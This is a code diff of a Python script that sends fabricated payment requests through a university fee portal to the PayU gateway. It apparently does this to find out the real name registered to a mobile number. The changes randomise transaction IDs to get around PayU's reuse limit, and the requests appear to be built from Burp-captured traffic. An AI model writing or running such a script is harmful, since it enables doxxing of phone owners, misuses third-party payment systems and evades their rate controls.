@@ -36,9 +36,11 @@ def get_hash_value(html_content):
 
 # Send GET request to the payment page and extract the hash value
 def _get_hash(mobileno, random_email, random4letter):
+    # Generate a fresh txnid each call to avoid PayU's reuse limit
+    rand_txn = 'FSTKN' + ''.join(random.choices(string.digits, k=18))
     url = (
         f"https://dbatu.unisuite.in/PaymentGatway/PaymentGateway/MakePayment"
-        f"?merchantTxnID=FSTKN970958575283250001"
+        f"?merchantTxnID={rand_txn}"
         f"&orderAmount=354"
         f"&MobielNo={mobileno}"
         f"&EmailID={random_email}"
@@ -51,33 +53,20 @@ def _get_hash(mobileno, random_email, random4letter):
         f"&PGiD=4"
     )
     response = requests.get(url, headers=HEADERS, timeout=15)
-    soup = __import__('bs4').BeautifulSoup(response.text, 'html.parser')
+    soup = BeautifulSoup(response.text, 'html.parser')
 
-    def _field(name):
-        tag = soup.find('input', {'name': name})
-        return tag['value'] if tag else None
-
-    hash_val      = _field('hash')
-    actual_email  = _field('email')      or random_email
-    actual_fname  = _field('firstname')  or (random4letter + ' Rao')
-    actual_phone  = _field('phone')      or mobileno
-    return hash_val, actual_email, actual_fname, actual_phone
-
-
-def _get_pid(mobileno, email, hash_value, firstname):
-    burp0_url = "https://secure.payu.in:443/_payment"
-    burp0_data = {
-        "pgEnquiryBy": "2", "drop_category": "NEFTRTGS", "udf1": '', "udf2": '', "udf3": '',
-        "udf4": '', "udf5": '', "hash": hash_value, "txnid": "FSTKN970958575283250001", "amount": "354",
-        "phone": mobileno, "email": email,
-        "surl": "https://DBATU.unisuite.in/PaymentGatway/PaymentGateway/gatewayresponse",
-        "curl": "https://DBATU.unisuite.in/PaymentGatway/PaymentGateway/gatewayresponse",
-        "furl": "https://DBATU.unisuite.in/PaymentGatway/PaymentGateway/gatewayresponse",
-        "firstname": firstname,
-        "productinfo": "Payment Towards Application Form Fees For Regular ",
-        "key": "Xp7re3"
+    # Collect all named form fields exactly as the server rendered them
+    form_fields = {
+        tag['name']: tag.get('value', '')
+        for tag in soup.find_all('input', {'name': True})
     }
-    response = requests.post(burp0_url, headers=HEADERS, data=burp0_data, allow_redirects=False)
+    return form_fields  # will be empty dict (falsy) if page failed
+
+
+def _get_pid(form_fields: dict):
+    """POST all form fields scraped from the DBATU page directly to PayU."""
+    burp0_url = "https://secure.payu.in:443/_payment"
+    response = requests.post(burp0_url, headers=HEADERS, data=form_fields, allow_redirects=False)
     location = response.headers.get('Location')
     return location.split('/')[-1] if location else None
 
@@ -97,11 +86,11 @@ def resolve_true_name(mobile: str):
     random_email = _rand_email()
     random4letter = _rand4()
     try:
-        hash_val, actual_email, actual_firstname, actual_phone = _get_hash(random_mobileno, random_email, random4letter)
-        if not hash_val:
+        form_fields = _get_hash(random_mobileno, random_email, random4letter)
+        if not form_fields.get('hash'):
             return None, "hash_not_found"
 
-        pid = _get_pid(actual_phone, actual_email, hash_val, actual_firstname)
+        pid = _get_pid(form_fields)
         if not pid:
             return None, "payment_id_failed"
 
